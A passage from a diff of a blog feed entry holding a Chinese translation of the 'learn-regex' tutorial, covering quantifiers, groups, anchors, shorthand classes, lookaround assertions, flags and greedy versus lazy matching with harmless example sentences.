+<p><a href="https://regex101.com/r/7m8me5/1">在线练习</a></p>
+<p><code>*</code>字符和<code>.</code>字符搭配可以匹配所有的字符<code>.*</code>。<br><code>*</code>和表示匹配空格的符号<code>\s</code>连起来用，如表达式<code>\s*cat\s*</code>匹配0或更多个空格开头和0或更多个空格结尾的cat字符串。</p>
+<pre>
+"\s*cat\s*" => The fat<a href="#learn-regex"><strong> cat </strong></a>sat on the con<a href="#learn-regex"><strong>cat</strong></a>enation.
+</pre>
+
+<p><a href="https://regex101.com/r/gGrwuz/1">在线练习</a></p>
+<h3 id="2-3-2-号"><a href="#2-3-2-号" class="headerlink" title="2.3.2 + 号"></a>2.3.2 <code>+</code> 号</h3><p><code>+</code>号匹配<code>+</code>号之前的字符出现 &gt;=1 次。<br>例如表达式<code>c.+t</code> 匹配以首字母<code>c</code>开头以<code>t</code>结尾，中间跟着至少一个字符的字符串。</p>
+<pre>
+"c.+t" => The fat <a href="#learn-regex"><strong>cat sat on the mat</strong></a>.
+</pre>
+
+<p><a href="https://regex101.com/r/Dzf9Aa/1">在线练习</a></p>
+<h3 id="2-3-3-号"><a href="#2-3-3-号" class="headerlink" title="2.3.3 ? 号"></a>2.3.3 <code>?</code> 号</h3><p>在正则表达式中元字符 <code>?</code> 标记在符号前面的字符为可选，即出现 0 或 1 次。<br>例如，表达式 <code>[T]?he</code> 匹配字符串 <code>he</code> 和 <code>The</code>。</p>
+<pre>
+"[T]he" => <a href="#learn-regex"><strong>The</strong></a> car is parked in the garage.
+</pre>
+
+<p><a href="https://regex101.com/r/cIg9zm/1">在线练习</a></p>
+<pre>
+"[T]?he" => <a href="#learn-regex"><strong>The</strong></a> car is parked in t<a href="#learn-regex"><strong>he</strong></a> garage.
+</pre>
+
+<p><a href="https://regex101.com/r/kPpO2x/1">在线练习</a></p>
+<h2 id="2-4-号"><a href="#2-4-号" class="headerlink" title="2.4 {} 号"></a>2.4 <code>&#123;&#125;</code> 号</h2><p>在正则表达式中 <code>&#123;&#125;</code> 是一个量词，常用来限定一个或一组字符可以重复出现的次数。<br>例如， 表达式 <code>[0-9]&#123;2,3&#125;</code> 匹配最少 2 位最多 3 位 0~9 的数字。</p>
+<pre>
+"[0-9]{2,3}" => The number was 9.<a href="#learn-regex"><strong>999</strong></a>7 but we rounded it off to <a href="#learn-regex"><strong>10</strong></a>.0.
+</pre>
+
+<p><a href="https://regex101.com/r/juM86s/1">在线练习</a></p>
+<p>我们可以省略第二个参数。<br>例如，<code>[0-9]&#123;2,&#125;</code> 匹配至少两位 0~9 的数字。</p>
+<pre>
+"[0-9]{2,}" => The number was 9.<a href="#learn-regex"><strong>9997</strong></a> but we rounded it off to <a href="#learn-regex"><strong>10</strong></a>.0.
+</pre>
+
+<p><a href="https://regex101.com/r/Gdy4w5/1">在线练习</a></p>
+<p>如果逗号也省略掉则表示重复固定的次数。<br>例如，<code>[0-9]&#123;3&#125;</code> 匹配3位数字</p>
+<pre>
+"[0-9]{3}" => The number was 9.<a href="#learn-regex"><strong>999</strong></a>7 but we rounded it off to 10.0.
+</pre>
+
+<p><a href="https://regex101.com/r/Sivu30/1">在线练习</a></p>
+<h2 id="2-5-特征标群"><a href="#2-5-特征标群" class="headerlink" title="2.5 (...) 特征标群"></a>2.5 <code>(...)</code> 特征标群</h2><p>特征标群是一组写在 <code>(...)</code> 中的子模式。<code>(...)</code> 中包含的内容将会被看成一个整体，和数学中小括号（ ）的作用相同。例如, 表达式 <code>(ab)*</code> 匹配连续出现 0 或更多个 <code>ab</code>。如果没有使用 <code>(...)</code> ，那么表达式 <code>ab*</code> 将匹配连续出现 0 或更多个 <code>b</code> 。再比如之前说的 <code>&#123;&#125;</code> 是用来表示前面一个字符出现指定次数。但如果在 <code>&#123;&#125;</code> 前加上特征标群 <code>(...)</code> 则表示整个标群内的字符重复 N 次。</p>
+<p>我们还可以在 <code>()</code> 中用或字符 <code>|</code> 表示或。例如，<code>(c|g|p)ar</code> 匹配 <code>car</code> 或 <code>gar</code> 或 <code>par</code>.</p>
+<pre>
+"(c|g|p)ar" => The <a href="#learn-regex"><strong>car</strong></a> is <a href="#learn-regex"><strong>par</strong></a>ked in the <a href="#learn-regex"><strong>gar</strong></a>age.
+</pre>
+
+<p><a href="https://regex101.com/r/tUxrBG/1">在线练习</a></p>
+<h2 id="2-6-或运算符"><a href="#2-6-或运算符" class="headerlink" title="2.6 | 或运算符"></a>2.6 <code>|</code> 或运算符</h2><p>或运算符就表示或，用作判断条件。</p>
+<p>例如 <code>(T|t)he|car</code> 匹配 <code>(T|t)he</code> 或 <code>car</code>。</p>
+<pre>
+"(T|t)he|car" => <a href="#learn-regex"><strong>The</strong></a> <a href="#learn-regex"><strong>car</strong></a> is parked in <a href="#learn-regex"><strong>the</strong></a> garage.
+</pre>
+
+<p><a href="https://regex101.com/r/fBXyX0/1">在线练习</a></p>
+<h2 id="2-7-转码特殊字符"><a href="#2-7-转码特殊字符" class="headerlink" title="2.7 转码特殊字符"></a>2.7 转码特殊字符</h2><p>反斜线 <code>\</code> 在表达式中用于转码紧跟其后的字符。用于指定 <code>&#123; &#125; [ ] / \ + * . $ ^ | ?</code> 这些特殊字符。如果想要匹配这些特殊字符则要在其前面加上反斜线 <code>\</code>。</p>
+<p>例如 <code>.</code> 是用来匹配除换行符外的所有字符的。如果想要匹配句子中的 <code>.</code> 则要写成 <code>\.</code> 以下这个例子 <code>\.?</code>是选择性匹配<code>.</code></p>
+<pre>
+"(f|c|m)at\.?" => The <a href="#learn-regex"><strong>fat</strong></a> <a href="#learn-regex"><strong>cat</strong></a> sat on the <a href="#learn-regex"><strong>mat.</strong></a>
+</pre>
+
+<p><a href="https://regex101.com/r/DOc5Nu/1">在线练习</a></p>
+<h2 id="2-8-锚点"><a href="#2-8-锚点" class="headerlink" title="2.8 锚点"></a>2.8 锚点</h2><p>在正则表达式中，想要匹配指定开头或结尾的字符串就要使用到锚点。<code>^</code> 指定开头，<code>$</code> 指定结尾。</p>
+<h3 id="2-8-1-号"><a href="#2-8-1-号" class="headerlink" title="2.8.1 ^ 号"></a>2.8.1 <code>^</code> 号</h3><p><code>^</code> 用来检查匹配的字符串是否在所匹配字符串的开头。</p>
+<p>例如，在 <code>abc</code> 中使用表达式 <code>^a</code> 会得到结果 <code>a</code>。但如果使用 <code>^b</code> 将匹配不到任何结果。因为在字符串 <code>abc</code> 中并不是以 <code>b</code> 开头。</p>
+<p>例如，<code>^(T|t)he</code> 匹配以 <code>The</code> 或 <code>the</code> 开头的字符串。</p>
+<pre>
+"(T|t)he" => <a href="#learn-regex"><strong>The</strong></a> car is parked in <a href="#learn-regex"><strong>the</strong></a> garage.
+</pre>
+
+<p><a href="https://regex101.com/r/5ljjgB/1">在线练习</a></p>
+<pre>
+"^(T|t)he" => <a href="#learn-regex"><strong>The</strong></a> car is parked in the garage.
+</pre>
+
+<p><a href="https://regex101.com/r/jXrKne/1">在线练习</a></p>
+<h3 id="2-8-2-号"><a href="#2-8-2-号" class="headerlink" title="2.8.2 $ 号"></a>2.8.2 <code>$</code> 号</h3><p>同理于 <code>^</code> 号，<code>$</code> 号用来匹配字符是否是最后一个。</p>
+<p>例如，<code>(at\.)$</code> 匹配以 <code>at.</code> 结尾的字符串。</p>
+<pre>
+"(at\.)" => The fat c<a href="#learn-regex"><strong>at.</strong></a> s<a href="#learn-regex"><strong>at.</strong></a> on the m<a href="#learn-regex"><strong>at.</strong></a>
+</pre>
+
+<p><a href="https://regex101.com/r/y4Au4D/1">在线练习</a></p>
+<pre>
+"(at\.)$" => The fat cat. sat. on the m<a href="#learn-regex"><strong>at.</strong></a>
+</pre>
+
+<p><a href="https://regex101.com/r/t0AkOd/1">在线练习</a></p>
+<h2 id="3-简写字符集"><a href="#3-简写字符集" class="headerlink" title="3. 简写字符集"></a>3. 简写字符集</h2><p>正则表达式提供一些常用的字符集简写。如下:</p>
+<table>
+<thead>
+<tr>
+<th align="center">简写</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">.</td>
+<td>除换行符外的所有字符</td>
+</tr>
+<tr>
+<td align="center">\w</td>
+<td>匹配所有字母数字，等同于 <code>[a-zA-Z0-9_]</code></td>
+</tr>
+<tr>
+<td align="center">\W</td>
+<td>匹配所有非字母数字，即符号，等同于： <code>[^\w]</code></td>
+</tr>
+<tr>
+<td align="center">\d</td>
+<td>匹配数字： <code>[0-9]</code></td>
+</tr>
+<tr>
+<td align="center">\D</td>
+<td>匹配非数字： <code>[^\d]</code></td>
+</tr>
+<tr>
+<td align="center">\s</td>
+<td>匹配所有空格字符，等同于： <code>[\t\n\f\r\p&#123;Z&#125;]</code></td>
+</tr>
+<tr>
+<td align="center">\S</td>
+<td>匹配所有非空格字符： <code>[^\s]</code></td>
+</tr>
+<tr>
+<td align="center">\f</td>
+<td>匹配一个换页符</td>
+</tr>
+<tr>
+<td align="center">\n</td>
+<td>匹配一个换行符</td>
+</tr>
+<tr>
+<td align="center">\r</td>
+<td>匹配一个回车符</td>
+</tr>
+<tr>
+<td align="center">\t</td>
+<td>匹配一个制表符</td>
+</tr>
+<tr>
+<td align="center">\v</td>
+<td>匹配一个垂直制表符</td>
+</tr>
+<tr>
+<td align="center">\p</td>
+<td>匹配 CR/LF（等同于 <code>\r\n</code>），用来匹配 DOS 行终止符</td>
+</tr>
+</tbody></table>
+<h2 id="4-零宽度断言（前后预查）"><a href="#4-零宽度断言（前后预查）" class="headerlink" title="4. 零宽度断言（前后预查）"></a>4. 零宽度断言（前后预查）</h2><p>先行断言和后发断言（合称 lookaround）都属于<strong>非捕获组</strong>（用于匹配模式，但不包括在匹配列表中）。当我们需要一个模式的前面或后面有另一个特定的模式时，就可以使用它们。</p>
+<p>例如，我们希望从下面的输入字符串 <code>$4.44</code> 和 <code>$10.88</code> 中获得所有以 <code>$</code> 字符开头的数字，我们将使用以下的正则表达式 <code>(?&lt;=\$)[0-9\.]*</code>。意思是：获取所有包含 <code>.</code> 并且前面是 <code>$</code> 的数字。</p>
+<p>零宽度断言如下：</p>
+<table>
+<thead>
+<tr>
+<th align="center">符号</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">?=</td>
+<td>正先行断言-存在</td>
+</tr>
+<tr>
+<td align="center">?!</td>
+<td>负先行断言-排除</td>
+</tr>
+<tr>
+<td align="center">?&lt;=</td>
+<td>正后发断言-存在</td>
+</tr>
+<tr>
+<td align="center">?&lt;!</td>
+<td>负后发断言-排除</td>
+</tr>
+</tbody></table>
+<h3 id="4-1-正先行断言"><a href="#4-1-正先行断言" class="headerlink" title="4.1 ?=... 正先行断言"></a>4.1 <code>?=...</code> 正先行断言</h3><p><code>?=...</code> 正先行断言，表示第一部分表达式之后必须跟着 <code>?=...</code>定义的表达式。</p>
+<p>返回结果只包含满足匹配条件的第一部分表达式。<br>定义一个正先行断言要使用 <code>()</code>。在括号内部使用一个问号和等号： <code>(?=...)</code>。</p>
+<p>正先行断言的内容写在括号中的等号后面。<br>例如，表达式 <code>(T|t)he(?=\sfat)</code> 匹配 <code>The</code> 和 <code>the</code>，在括号中我们又定义了正先行断言 <code>(?=\sfat)</code> ，即 <code>The</code> 和 <code>the</code> 后面紧跟着 <code>(空格)fat</code>。</p>
+<pre>
+"(T|t)he(?=\sfat)" => <a href="#learn-regex"><strong>The</strong></a> fat cat sat on the mat.
+</pre>
+
+<p><a href="https://regex101.com/r/IDDARt/1">在线练习</a></p>
+<h3 id="4-2-负先行断言"><a href="#4-2-负先行断言" class="headerlink" title="4.2 ?!... 负先行断言"></a>4.2 <code>?!...</code> 负先行断言</h3><p>负先行断言 <code>?!</code> 用于筛选所有匹配结果，筛选条件为 其后不跟随着断言中定义的格式。<br><code>正先行断言</code>  定义和 <code>负先行断言</code> 一样，区别就是 <code>=</code> 替换成 <code>!</code> 也就是 <code>(?!...)</code>。</p>
+<p>表达式 <code>(T|t)he(?!\sfat)</code> 匹配 <code>The</code> 和 <code>the</code>，且其后不跟着 <code>(空格)fat</code>。</p>
+<pre>
+"(T|t)he(?!\sfat)" => The fat cat sat on <a href="#learn-regex"><strong>the</strong></a> mat.
+</pre>
+
+<p><a href="https://regex101.com/r/V32Npg/1">在线练习</a></p>
+<h3 id="4-3-lt-正后发断言"><a href="#4-3-lt-正后发断言" class="headerlink" title="4.3 ?&lt;= ... 正后发断言"></a>4.3 <code>?&lt;= ...</code> 正后发断言</h3><p>正后发断言 记作<code>(?&lt;=...)</code> 用于筛选所有匹配结果，筛选条件为 其前跟随着断言中定义的格式。<br>例如，表达式 <code>(?&lt;=(T|t)he\s)(fat|mat)</code> 匹配 <code>fat</code> 和 <code>mat</code>，且其前跟着 <code>The</code> 或 <code>the</code>。</p>
+<pre>
+"(?<=(T|t)he\s)(fat|mat)" => The <a href="#learn-regex"><strong>fat</strong></a> cat sat on the <a href="#learn-regex"><strong>mat</strong></a>.
+</pre>
+
+<p><a href="https://regex101.com/r/avH165/1">在线练习</a></p>
+<h3 id="4-4-lt-负后发断言"><a href="#4-4-lt-负后发断言" class="headerlink" title="4.4 ?&lt;!... 负后发断言"></a>4.4 <code>?&lt;!...</code> 负后发断言</h3><p>负后发断言 记作 <code>(?&lt;!...)</code> 用于筛选所有匹配结果，筛选条件为 其前不跟随着断言中定义的格式。<br>例如，表达式 <code>(?&lt;!(T|t)he\s)(cat)</code> 匹配 <code>cat</code>，且其前不跟着 <code>The</code> 或 <code>the</code>。</p>
+<pre>
+"(?&lt;!(T|t)he\s)(cat)" => The cat sat on <a href="#learn-regex"><strong>cat</strong></a>.
+</pre>
+
+<p><a href="https://regex101.com/r/8Efx5G/1">在线练习</a></p>
+<h2 id="5-标志"><a href="#5-标志" class="headerlink" title="5. 标志"></a>5. 标志</h2><p>标志也叫模式修正符，因为它可以用来修改表达式的搜索结果。<br>这些标志可以任意的组合使用，它也是整个正则表达式的一部分。</p>
+<table>
+<thead>
+<tr>
+<th align="center">标志</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">i</td>
+<td>忽略大小写。</td>
+</tr>
+<tr>
+<td align="center">g</td>
+<td>全局搜索。</td>
+</tr>
+<tr>
+<td align="center">m</td>
+<td>多行修饰符：锚点元字符 <code>^</code> <code>$</code> 工作范围在每行的起始。</td>
+</tr>
+</tbody></table>
+<h3 id="5-1-忽略大小写-Case-Insensitive"><a href="#5-1-忽略大小写-Case-Insensitive" class="headerlink" title="5.1 忽略大小写 (Case Insensitive)"></a>5.1 忽略大小写 (Case Insensitive)</h3><p>修饰语 <code>i</code> 用于忽略大小写。<br>例如，表达式 <code>/The/gi</code> 表示在全局搜索 <code>The</code>，在后面的 <code>i</code> 将其条件修改为忽略大小写，则变成搜索 <code>the</code> 和 <code>The</code>，<code>g</code> 表示全局搜索。</p>
+<pre>
+"The" => <a href="#learn-regex"><strong>The</strong></a> fat cat sat on the mat.
+</pre>
+
+<p><a href="https://regex101.com/r/dpQyf9/1">在线练习</a></p>
+<pre>
+"/The/gi" => <a href="#learn-regex"><strong>The</strong></a> fat cat sat on <a href="#learn-regex"><strong>the</strong></a> mat.
+</pre>
+
+<p><a href="https://regex101.com/r/ahfiuh/1">在线练习</a></p>
+<h3 id="5-2-全局搜索-Global-search"><a href="#5-2-全局搜索-Global-search" class="headerlink" title="5.2 全局搜索 (Global search)"></a>5.2 全局搜索 (Global search)</h3><p>修饰符 <code>g</code> 常用于执行一个全局搜索匹配，即（不仅仅返回第一个匹配的，而是返回全部）。<br>例如，表达式 <code>/.(at)/g</code> 表示搜索 任意字符（除了换行）+ <code>at</code>，并返回全部结果。</p>
+<pre>
+"/.(at)/" => The <a href="#learn-regex"><strong>fat</strong></a> cat sat on the mat.
+</pre>
+
+<p><a href="https://regex101.com/r/jnk6gM/1">在线练习</a></p>
+<pre>
+"/.(at)/g" => The <a href="#learn-regex"><strong>fat</strong></a> <a href="#learn-regex"><strong>cat</strong></a> <a href="#learn-regex"><strong>sat</strong></a> on the <a href="#learn-regex"><strong>mat</strong></a>.
+</pre>
+
+<p><a href="https://regex101.com/r/dO1nef/1">在线练习</a></p>
+<h3 id="5-3-多行修饰符-Multiline"><a href="#5-3-多行修饰符-Multiline" class="headerlink" title="5.3 多行修饰符 (Multiline)"></a>5.3 多行修饰符 (Multiline)</h3><p>多行修饰符 <code>m</code> 常用于执行一个多行匹配。</p>
+<p>像之前介绍的 <code>(^,$)</code> 用于检查格式是否是在待检测字符串的开头或结尾。但我们如果想要它在每行的开头和结尾生效，我们需要用到多行修饰符 <code>m</code>。</p>
+<p>例如，表达式 <code>/at(.)?$/gm</code> 表示小写字符 <code>a</code> 后跟小写字符 <code>t</code> ，末尾可选除换行符外任意字符。根据 <code>m</code> 修饰符，现在表达式匹配每行的结尾。</p>
+<pre>
+"/.at(.)?$/" => The fat
+                cat sat
+                on the <a href="#learn-regex"><strong>mat.</strong></a>
+</pre>
+
+<p><a href="https://regex101.com/r/hoGMkP/1">在线练习</a></p>
+<pre>
+"/.at(.)?$/gm" => The <a href="#learn-regex"><strong>fat</strong></a>
+                  cat <a href="#learn-regex"><strong>sat</strong></a>
+                  on the <a href="#learn-regex"><strong>mat.</strong></a>
+</pre>
+
+<p><a href="https://regex101.com/r/E88WE2/1">在线练习</a></p>
+<h3 id="6-贪婪匹配与惰性匹配-Greedy-vs-lazy-matching"><a href="#6-贪婪匹配与惰性匹配-Greedy-vs-lazy-matching" class="headerlink" title="6. 贪婪匹配与惰性匹配 (Greedy vs lazy matching)"></a>6. 贪婪匹配与惰性匹配 (Greedy vs lazy matching)</h3><p>正则表达式默认采用贪婪匹配模式，在该模式下意味着会匹配尽可能长的子串。我们可以使用 <code>?</code> 将贪婪匹配模式转化为惰性匹配模式。</p>
+<pre>
+"/(.*at)/" => <a href="#learn-regex"><strong>The fat cat sat on the mat</strong></a>. </pre>
+
+<p><a href="https://regex101.com/r/AyAdgJ/1">在线练习</a></p>
+<pre>
+"/(.*?at)/" => <a href="#learn-regex"><strong>The fat</strong></a> cat sat on the mat. </pre>
+
+<p><a href="https://regex101.com/r/AyAdgJ/2">在线练习</a></p>
+<h2 id="许可证"><a href="#许可证" class="headerlink" title="许可证"></a>许可证</h2><p>MIT &copy; <a href="https://twitter.com/ziishaned">Zeeshan Ahmad</a></p>
+]]></content>
+      <categories>
+        <category>开发工具</category>
+      </categories>
+      <tags>
+        <tag>re</tag>
       </tags>
   </entry>
   <entry>
